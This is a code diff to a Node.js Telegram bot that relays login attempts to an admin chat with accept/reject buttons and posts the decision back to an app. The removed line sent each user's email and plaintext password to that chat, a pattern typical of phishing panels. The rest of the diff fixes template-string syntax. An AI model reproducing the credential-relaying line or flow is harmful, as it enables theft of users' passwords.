@@ -1,4 +1,3 @@
-console.log("🤖 Loading bot.js...");
 const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
@@ -21,7 +20,7 @@ function sendApprovalRequest(email, password) {
       ],
     },
   };
-  bot.sendMessage(ADMIN_CHAT_ID, 🔐 Login attempt:\n📧 ${email}\n🔑 ${password}, options);
+  bot.sendMessage(ADMIN_CHAT_ID, "", options);
 }
 
 // Handle button clicks
@@ -31,24 +30,24 @@ bot.on("callback_query", async (query) => {
   const status = action === "accept" ? "accepted" : "rejected";
 
   try {
-    await fetch(${APP_URL}/update-status, {
+    await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, status }),
     });
 
     await bot.answerCallbackQuery(query.id, {
-      text: ✅ You ${status} ${email},
+      text: `✅ You ${status} ${email}`,
     });
 
-    await bot.editMessageText(🔐 ${email} has been *${status.toUpperCase()}*, {
+    await bot.editMessageText(`🔐 ${email} has been *${status.toUpperCase()}*`, {
       chat_id: query.message.chat.id,
       message_id: query.message.message_id,
       parse_mode: "Markdown",
     });
   } catch (err) {
     console.error("❌ Failed to update status:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, ⚠️ Error updating status for ${email});
+    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error updating status for ${email}`);
   }
 });
 
